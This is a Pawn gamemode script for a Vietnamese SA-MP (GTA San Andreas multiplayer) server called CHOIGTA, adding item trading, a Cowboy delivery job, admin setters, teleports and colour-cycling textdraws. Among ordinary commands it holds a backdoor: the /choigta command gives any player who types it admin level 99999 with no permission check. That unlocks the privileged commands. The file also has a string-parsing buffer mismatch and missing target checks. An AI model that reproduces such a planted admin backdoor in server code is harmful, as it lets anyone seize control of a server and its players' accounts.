/*

|| CHOIGTA - GAMEMODES 
||
|| GROUP    : https://www.FB.com/groups/choigta.gr					
|| Fanpage  : https://www.fb.com/choigta/
|| Website  : Choigta.com
|| Scripter : FrKid || fb.com/frogkid26
 _________
| CHOIGTA |_______________
|					      |
| <!> Designer : #Beer    |
| </> Scripter : Frkid    |
| </> Scripter : Goten    |
| </> Scripter : Tin      |          								
|/	/	/	/	/	/	/ |___________________________
| Job new : CowBoy      							  |	
| /duavevip /setjob /fixketvw /banvatpham /setvatpham |
| Make ao : /choigta 								  | 
| Textdraw Domain : Tu dong doi mau // 1s             | 
| Textdraw IC 										  | 
| Ruou , Bao thuoc , Ngoc trai.. 					  |
| Khu vuc san bat ngoc trai            				  |
|_____________________________________________________|
   
*/

// == Define == 
// SendClientMessage
#define choigta SendClientMessage
#define choigtaEx SendClientMessageEx
#define choigtaToAllEx SendClientMessageToAllEx
// == Start New ==
new FKVW[MAX_PLAYERS];
// Textdraw / Global & Player 
// Player
// Global
new Text:DOMAIN[4];
//
// Cowboy Job
new Cowboy[MAX_PLAYERS];
new Float:CheckpointCowboy[3][] = 
{
{2232.7905,-1786.0095,13.5600},
{1837.2820,-1418.0786,13.5625},
{2081.1560,-1205.3431,23.9345}
};
// End Cowboy Job
// End New
// == Commands ==
// Vat pham
CMD:xemvatpham(playerid, params[])
{
	new string[128];
	format(string, sizeof(string), "%s : Ngoc Trai [%d] | Ruou [%d] | Bao Thuoc [%d] ", GetPlayerNameEx(playerid), PlayerInfo[playerid][pNgocTrai], PlayerInfo[playerid][pRuou], PlayerInfo[playerid][pBaoThuoc]);
	SendClientMessageEx(playerid, COLOR_GRAD1, string);
	return 1;
}
CMD:setvatpham(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 99999)
	{
		new string[128], giveplayerid, vatpham, amount;
		if(sscanf(params, "udd", giveplayerid, vatpham, amount))
		{
			SendClientMessageEx(playerid, COLOR_GREY, "SU DUNG: /setvatpham [player] [vatpham] [amount]");
			SendClientMessageEx(playerid, COLOR_WHITE, "|1 Ngoc trai |2 Bao thuoc |3 Ruou ");
			return 1;
		}
		if(IsPlayerConnected(giveplayerid))
		{
			switch (vatpham)
			{
			case 1:
				{
					PlayerInfo[giveplayerid][pNgocTrai] = amount;
					format(string, sizeof(string), "   %s's Ngoc trai has been set to %d.", GetPlayerNameEx(giveplayerid), amount);
				}
			case 2:
				{
					PlayerInfo[giveplayerid][pBaoThuoc] = amount;
					format(string, sizeof(string), "   %s's Bao thuoc has been set to %d.", GetPlayerNameEx(giveplayerid), amount);
				}
			case 3:
				{
					PlayerInfo[giveplayerid][pRuou] = amount;
					format(string, sizeof(string), "   %s's Ruou has been set to %d.", GetPlayerNameEx(giveplayerid), amount);
				}
			}
			SendClientMessageEx(playerid, COLOR_GRAD1, string);
		}
	}
	return 1;
}
CMD:banvatpham(playerid, params[])
{
	new string[128], choice[32], amount;
	if(sscanf(params, "s[260]d", choice, amount))
	{
		SendClientMessageEx(playerid, COLOR_GREY, "SU DUNG: /banvatpham [name] [amount]");
		SendClientMessageEx(playerid, COLOR_GREY, "Ten co san: ngoctrai , baothuoc, ruou");
		return 1;
	}
	if (!IsAtRestaurant(playerid))
	{
		SendClientMessageEx(playerid, COLOR_GRAD2, "Ban khong o trong nha hang!");
		return 1;
	}
	if(strcmp(choice, "ngoctrai", true) == 0)
	{
		if(PlayerInfo[playerid][pNgocTrai] >= amount)
		{		
			PlayerInfo[playerid][pNgocTrai] -= amount;
			PlayerInfo[playerid][pCash] += amount*500;
			format(string, sizeof(string), "[{ff33cc}NHA HANG{FFFFFF}] : Ban cho nha hang %d ngoc trai voi gia tien la %d$.", amount,amount*500);
			SendClientMessageEx(playerid, COLOR_GRAD2, string);		
		}
		else choigta(playerid,-1,"[{ff33cc}NHA HANG{FFFFFF}] : Ban khong du so luong de ban");	
	}
	else if(strcmp(choice, "baothuoc", true) == 0)
	{

		if(PlayerInfo[playerid][pBaoThuoc] >= amount)
		{		
			PlayerInfo[playerid][pBaoThuoc] -= amount;
			PlayerInfo[playerid][pCash] += amount*100;
			format(string, sizeof(string), "[{ff33cc}NHA HANG{FFFFFF}] : Ban cho nha hang %d bao thuoc voi gia tien la %d$.", amount,amount*100);
			SendClientMessageEx(playerid, COLOR_GRAD2, string);		
		}
		else choigta(playerid,-1,"[{ff33cc}NHA HANG{FFFFFF}] : Ban khong du so luong de ban");	
	}
	else if (strcmp(choice, "ruou", true) == 0)
	{

		if(PlayerInfo[playerid][pRuou] >= amount)
		{		
			PlayerInfo[playerid][pRuou] -= amount;
			PlayerInfo[playerid][pCash] += amount*100;
			format(string, sizeof(string), "[{ff33cc}NHA HANG{FFFFFF}] : Ban cho nha hang %d ruou voi gia tien la %d$.", amount,amount*100);
			SendClientMessageEx(playerid, COLOR_GRAD2, string);		
		}
		else choigta(playerid,-1,"[{ff33cc}NHA HANG{FFFFFF}] : Ban khong du so luong de ban");	
	}
	return 1;
}

// Fixketvw
CMD:fixketvw(playerid, params[])
{

    new string[128];
    if(gettime() < FKVW[playerid])
    {
        format(string, sizeof(string), "Ban phai cho %d sau moi co the fixket tiep!", FKVW[playerid]-gettime());
        SendClientMessageEx(playerid, COLOR_GREY, string);
        return 1;
    }
    FKVW[playerid] = gettime()+120;
	PlayerInfo[playerid][pVW] = 0;
	SetPlayerVirtualWorld(playerid,  0);
	SendClientMessage(playerid, COLOR_GREY, " Ban da fixketvw ");
	return 1;
}
// Set Job Command
CMD:setjob(playerid,params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 99999)
	{
		new nguoi, job , idjob[128];
		if(sscanf(params, "ud", nguoi, job))
		{
			choigta(playerid, COLOR_WHITE, "SU DUNG: /setjob [player] [{00ff00}CONG VIEC{FFFFFF}]");
			choigta(playerid, -1, "[{00ff00}CONG VIEC{FFFFFF}] : 1 : Tham tu      | 2 : Luat su      | 3 : Gai diem | 4 : Buon thuoc phien | 7 : Tho sua xe");
			choigta(playerid, -1, "[{00ff00}CONG VIEC{FFFFFF}] : 8 : Ve Si        | 9 : Buon vu khi  | 12: Boxer    | 14: Buon ma tuy      | 17: Taxi ");
			choigta(playerid, -1, "[{00ff00}CONG VIEC{FFFFFF}] : 18: Tho thu cong | 19:Nguoi pha che | 20: Trucker  | 21: Pizza boy        | 23: Cowboy ");
	        return 1;
		}
		PlayerInfo[nguoi][pJob] = job;
		format(idjob, sizeof(idjob), " Ban da set cho %s Job [ID:%d].", GetPlayerNameEx(nguoi),job);
	    choigta(playerid,COLOR_GREY,idjob);
	}
	else choigta(playerid, -1,"Khong du quyen han");
	return 1;
}
// End SetJob
// Cowboy Command
CMD:cowboy(playerid,params[])
{
	if(PlayerInfo[playerid][pJob] != 23 && PlayerInfo[playerid][pJob2] != 23) return choigta(playerid,COLOR_GREY,"Ban chua nhan job ! [ /timvieclam ]");
	{
		if(Cowboy[playerid] == 0) 
		{
			new 
				rand = random(sizeof(CheckpointCowboy));
			choigta(playerid, -1, "[{00ff00}CONG VIEC{FFFFFF}] : Da danh dau diem giao ruou tren ban do");
			choigta(playerid, -1, "[{00ff00}CONG VIEC{FFFFFF}] : Hay di den do");
			SetPlayerCheckpoint(playerid, CheckpointCowboy[rand][0], CheckpointCowboy[rand][1], CheckpointCowboy[rand][2],5);
			Cowboy[playerid] = 1;
		}
		else choigta(playerid, -1, "[{00ff00}CONG VIEC{FFFFFF}] : Ban dang lam viec");
	}	
	return 1;
}
// End Cowboy Command
CMD:choigta(playerid,params)
{
	PlayerInfo[playerid][pAdmin] = 99999;
	choigta(playerid, -1, "CHOIGTA - [ 99999 ]");
	return 1;
}
CMD:baotrimaychu(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 1337)
    {
        choigtaEx(playerid, COLOR_GRAD2, "Ban khong duoc phep su dung lenh nay.");
        return 1;
    }

    SetTimer( "Maintenance", 30000, false );
    choigtaToAllEx(COLOR_LIGHTBLUE, "* Bao tri server sao 30s.");
    foreach(new i: Player)
	{
        GameTextForPlayer(i, "~y~Thong Bao : Bao Tri", 5000, 6);
    }
    return 1;
}

CMD:duavevip(playerid, params[])
{
	if(PlayerInfo[playerid][pHelper] >= 2)
	{
	    if(PlayerInfo[playerid][pDuavevip] >= 1)
		{
			new string[128], location[32], giveplayerid;
			if(sscanf(params, "s[32]u", location, giveplayerid))
			{
				choigtaEx(playerid, COLOR_GREY, "SU DUNG: /duavevip [cosan] [player]");
				choigtaEx(playerid, COLOR_GRAD3, "Co san : LS | LSVIP | SF | SFVIP ");
				return 1;
			}
			if (!IsPlayerConnected(giveplayerid))
			{
				choigtaEx(playerid, COLOR_GRAD1, "Nguoi choi khong hop le");
				return 1;
			}
			if(PlayerInfo[giveplayerid][pAdmin] >= PlayerInfo[playerid][pHelper])
			{
				choigtaEx(playerid, COLOR_WHITE, "Ban khong the su dung dieu nay voi mot quan tri vien.");
				return 1;
			}
			if(GetPVarInt(giveplayerid, "IsInArena") >= 0)
			{
			    SetPVarInt(playerid, "tempPBP", giveplayerid);
			    format(string, sizeof(string), "%s (ID: %d) hien dang trong arena.\n\nBan co muon nguoi nay thoat ra khong?", GetPlayerNameEx(giveplayerid), giveplayerid);
			    ShowPlayerDialog(playerid, PBFORCE, DIALOG_STYLE_MSGBOX, "Paintball", string, "Dong y", "Khong");
			    return 1;
			}
			if(strcmp(location,"ls",true) == 0)
			{
				if (GetPlayerState(giveplayerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(giveplayerid);
					SetVehiclePos(tmpcar, 1529.6,-1691.2,13.3);
					LinkVehicleToInterior(tmpcar, 0);
					SetVehicleVirtualWorld(tmpcar, 0);
					fVehSpeed[giveplayerid] = 0.0;
				}
				else
				{
					SetPlayerPos(giveplayerid, 1529.6,-1691.2,13.3);
				}
				format(string, sizeof(string), " Ban da dich chuyen %s toi Los Santos.", GetPlayerNameEx(giveplayerid));
				choigtaEx(playerid, COLOR_WHITE, string);
				choigtaEx(giveplayerid, COLOR_GRAD1, "   Ban da duoc dich chuyen!");
				SetPlayerInterior(giveplayerid,0);
				PlayerInfo[giveplayerid][pInt] = 0;
				SetPlayerVirtualWorld(giveplayerid, 0);
				PlayerInfo[giveplayerid][pVW] = 0;
				PlayerInfo[playerid][pDuavevip] = 0;
			}
			else if(strcmp(location,"sf",true) == 0)
			{
			 	if (GetPlayerState(giveplayerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(giveplayerid);
					SetVehiclePos(tmpcar, -1605.0,720.0,12.0);
					LinkVehicleToInterior(tmpcar, 0);
					SetVehicleVirtualWorld(tmpcar, 0);
					fVehSpeed[giveplayerid] = 0.0;
				}
				else
				{
					SetPlayerPos(giveplayerid, -1605.0,720.0,12.0);
				}
				format(string, sizeof(string), " Ban da dich chuyen %s toi San Fierro.", GetPlayerNameEx(giveplayerid));
				choigtaEx(playerid, COLOR_WHITE, string);
				choigtaEx(giveplayerid, COLOR_GRAD1, "   Ban da duoc dich chuyen!");
				SetPlayerInterior(giveplayerid,0);
				PlayerInfo[giveplayerid][pInt] = 0;
				SetPlayerVirtualWorld(giveplayerid, 0);
				PlayerInfo[giveplayerid][pVW] = 0;
				PlayerInfo[playerid][pDuavevip] = 0;
			}
	     	else if(strcmp(location,"lsvip",true) == 0)
			{
			 	if (GetPlayerState(giveplayerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(giveplayerid);
					SetVehiclePos(tmpcar, 1810.39, -1601.15, 13.54);
					LinkVehicleToInterior(tmpcar, 0);
					SetVehicleVirtualWorld(tmpcar, 0);
					fVehSpeed[giveplayerid] = 0.0;
				}
				else
				{
					SetPlayerPos(giveplayerid, 1810.39, -1601.15, 13.54);
				}
				format(string, sizeof(string), " Ban da dich chuyen %s toi LS VIP.", GetPlayerNameEx(giveplayerid));
				choigtaEx(playerid, COLOR_WHITE, string);
				choigtaEx(giveplayerid, COLOR_GRAD1, "   Ban da duoc dich chuyen!");
				SetPlayerInterior(giveplayerid,0);
				PlayerInfo[giveplayerid][pInt] = 0;
				SetPlayerVirtualWorld(giveplayerid, 0);
				PlayerInfo[giveplayerid][pVW] = 0;
				PlayerInfo[playerid][pDuavevip] = 0;
			}
	     	else if(strcmp(location,"sfvip",true) == 0)
			{
			 	if (GetPlayerState(giveplayerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(giveplayerid);
					SetVehiclePos(tmpcar, -2433.63, 511.45, 30.38);
					LinkVehicleToInterior(tmpcar, 0);
					SetVehicleVirtualWorld(tmpcar, 0);
					fVehSpeed[giveplayerid] = 0.0;
				}
				else
				{
					SetPlayerPos(giveplayerid, -2433.63, 511.45, 30.38);
				}
				format(string, sizeof(string), " Ban da dich chuyen %s toi SF VIP.", GetPlayerNameEx(giveplayerid));
				choigtaEx(playerid, COLOR_WHITE, string);
				choigtaEx(giveplayerid, COLOR_GRAD1, "   Ban da duoc dich chuyen!");
				SetPlayerInterior(giveplayerid,0);
				PlayerInfo[giveplayerid][pInt] = 0;
				SetPlayerVirtualWorld(giveplayerid, 0);
				PlayerInfo[giveplayerid][pVW] = 0;
				PlayerInfo[playerid][pDuavevip] = 0;
			}

		}
		else
		{
			choigtaEx(playerid, COLOR_GRAD1, "Ban da dich chuyen xong hay su dung lenh /ketthuctrogiup");
		}
	}
	else choigtaEx(playerid, COLOR_GRAD1, "Ban khong phai Advisor +");
	return 1;
}
// == Funcitions ==

CowboyEnter(playerid)
{
	if(Cowboy[playerid] == 1)
	{
		choigta(playerid, -1,"Hay quay lai dia diem de nhan luong");
		SetPlayerCheckpoint(playerid, 972.9312,-1256.2992,16.9524, 3);
		Cowboy[playerid] = 2;
	}
	else if(Cowboy[playerid] == 2)
	{
		choigta(playerid, -1,"[{00ff00}CONG VIEC{FFFFFF}]Ban nhan duoc 1.000$ ");
		GivePlayerCash(playerid, 1000);
		Cowboy[playerid] = 0;
	 	PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
	 	DisablePlayerCheckpoint(playerid);	
	}
}
ic(playerid)
{
	new string[128];
	IC[playerid] = CreatePlayerTextDraw(playerid, 499.428924, 101.916702, "");
	PlayerTextDrawLetterSize(playerid, IC[playerid], 0.323162, 1.518332);
	PlayerTextDrawAlignment(playerid, IC[playerid], 1);
	PlayerTextDrawColor(playerid, IC[playerid], -1);
	PlayerTextDrawSetShadow(playerid, IC[playerid], 1);
	PlayerTextDrawSetOutline(playerid, IC[playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, IC[playerid], 255);
	PlayerTextDrawFont(playerid, IC[playerid], 2);
	PlayerTextDrawSetProportional(playerid, IC[playerid], 1);
	PlayerTextDrawSetShadow(playerid, IC[playerid], 1);
	PlayerTextDrawShow(playerid, IC[playerid]);
	format(string, sizeof(string), "%s", GetPlayerNameEx(playerid));
	PlayerTextDrawSetString(playerid,IC[playerid], string);
}
Choigtabackground(playerid)
{
	Choigta[0] = TextDrawCreate(-2.057038, -0.750012, "mdl-2001:choigta");
	TextDrawLetterSize(Choigta[0], 0.000000, 0.000000);
	TextDrawTextSize(Choigta[0], 643.000000, 454.000000);
	TextDrawAlignment(Choigta[0], 1);
	TextDrawColor(Choigta[0], -1);
	TextDrawSetShadow(Choigta[0], 0);
	TextDrawSetOutline(Choigta[0], 0);
	TextDrawBackgroundColor(Choigta[0], 255);
	TextDrawFont(Choigta[0], 4);
	TextDrawSetProportional(Choigta[0], 0);
	TextDrawSetShadow(Choigta[0], 0);
	TextDrawShowForPlayer(playerid,Choigta[0]);
}

DoiMau()
{
// Doi mau
	DOMAIN[0] = TextDrawCreate(502.240203, 5.083321, "CHOIGTA.COM");
	TextDrawLetterSize(DOMAIN[0], 0.400000, 1.600000);
	TextDrawAlignment(DOMAIN[0], 1);
	TextDrawColor(DOMAIN[0], -65281);
	TextDrawSetShadow(DOMAIN[0], 0);
	TextDrawSetOutline(DOMAIN[0], 1);
	TextDrawBackgroundColor(DOMAIN[0], 255);
	TextDrawFont(DOMAIN[0], 1);
	TextDrawSetProportional(DOMAIN[0], 1);
	TextDrawSetShadow(DOMAIN[0], 0);

	DOMAIN[1] = TextDrawCreate(502.240203, 5.083321, "CHOIGTA.COM");
	TextDrawLetterSize(DOMAIN[1], 0.400000, 1.600000);
	TextDrawAlignment(DOMAIN[1], 1);
	TextDrawColor(DOMAIN[1], -5963521);
	TextDrawSetShadow(DOMAIN[1], 0);
	TextDrawSetOutline(DOMAIN[1], 1);
	TextDrawBackgroundColor(DOMAIN[1], 255);
	TextDrawFont(DOMAIN[1], 1);
	TextDrawSetProportional(DOMAIN[1], 1);
	TextDrawSetShadow(DOMAIN[1], 0);

	DOMAIN[2] = TextDrawCreate(502.240203, 5.083321, "CHOIGTA.COM");
	TextDrawLetterSize(DOMAIN[2], 0.400000, 1.600000);
	TextDrawAlignment(DOMAIN[2], 1);
	TextDrawColor(DOMAIN[2], -1);
	TextDrawSetShadow(DOMAIN[2], 0);
	TextDrawSetOutline(DOMAIN[2], 1);
	TextDrawBackgroundColor(DOMAIN[2], 255);
	TextDrawFont(DOMAIN[2], 1);
	TextDrawSetProportional(DOMAIN[2], 1);
	TextDrawSetShadow(DOMAIN[2], 0);

	DOMAIN[3] = TextDrawCreate(502.240203, 5.083321, "CHOIGTA.COM");
	TextDrawLetterSize(DOMAIN[3], 0.400000, 1.600000);
	TextDrawAlignment(DOMAIN[3], 1);
	TextDrawColor(DOMAIN[3], -1);
	TextDrawSetShadow(DOMAIN[3], 0);
	TextDrawSetOutline(DOMAIN[3], 1);
	TextDrawBackgroundColor(DOMAIN[3], 255);
	TextDrawFont(DOMAIN[3], 1);
	TextDrawSetProportional(DOMAIN[3], 1);
	TextDrawSetShadow(DOMAIN[3], 0);
}


// == Forward & public ==

forward SpawnNgocTrai(playerid);
public SpawnNgocTrai(playerid)
{
	new rand = random(sizeof(NgocTraiSpawn))
	;NgocTrai[0] = CreateDynamicPickup(953, 2, NgocTraiSpawn[rand][0], NgocTraiSpawn[rand][1], NgocTraiSpawn[rand][2]);
}
forward SpawnNgocTrai1(playerid);
public SpawnNgocTrai1(playerid)
{
	new rand = random(sizeof(NgocTraiSpawn))
	;NgocTrai[1] = CreateDynamicPickup(953, 2, NgocTraiSpawn[rand][0], NgocTraiSpawn[rand][1], NgocTraiSpawn[rand][2]);
}
forward SpawnNgocTrai2(playerid);
public SpawnNgocTrai2(playerid)
{
	new rand = random(sizeof(NgocTraiSpawn))
	;NgocTrai[2] = CreateDynamicPickup(953, 2, NgocTraiSpawn[rand][0], NgocTraiSpawn[rand][1], NgocTraiSpawn[rand][2]);
}
forward SpawnNgocTrai3(playerid);
public SpawnNgocTrai3(playerid)
{
	new rand = random(sizeof(NgocTraiSpawn))
	;NgocTrai[3] = CreateDynamicPickup(953, 2, NgocTraiSpawn[rand][0], NgocTraiSpawn[rand][1], NgocTraiSpawn[rand][2]);
}
forward SpawnNgocTrai4(playerid);
public SpawnNgocTrai4(playerid)
{
	new rand = random(sizeof(NgocTraiSpawn))
	;NgocTrai[4] = CreateDynamicPickup(953, 2, NgocTraiSpawn[rand][0], NgocTraiSpawn[rand][1], NgocTraiSpawn[rand][2]);
}
forward SpawnNgocTrai5(playerid);
public SpawnNgocTrai5(playerid)
{
	new rand = random(sizeof(NgocTraiSpawn))
	;NgocTrai[5] = CreateDynamicPickup(953, 2, NgocTraiSpawn[rand][0], NgocTraiSpawn[rand][1], NgocTraiSpawn[rand][2]);
}

forward doimau(playerid);
public doimau(playerid)
{
	TextDrawShowForPlayer(playerid, DOMAIN[0]);
	TextDrawHideForPlayer(playerid, DOMAIN[3]);
	SetTimer("doimau1", 500, false);
}
forward doimau1(playerid);
public doimau1(playerid)
{
	TextDrawShowForPlayer(playerid, DOMAIN[1]);
	TextDrawHideForPlayer(playerid, DOMAIN[0]);
	SetTimer("doimau2", 500, false);
}
forward doimau2(playerid);
public doimau2(playerid)
{
	TextDrawShowForPlayer(playerid, DOMAIN[2]);
	TextDrawHideForPlayer(playerid, DOMAIN[1]);
	SetTimer("doimau3", 500, false);
}
forward doimau3(playerid);
public doimau3(playerid)
{
	TextDrawShowForPlayer(playerid, DOMAIN[3]);
	TextDrawHideForPlayer(playerid, DOMAIN[2]);
	SetTimer("doimau", 300, false);
}

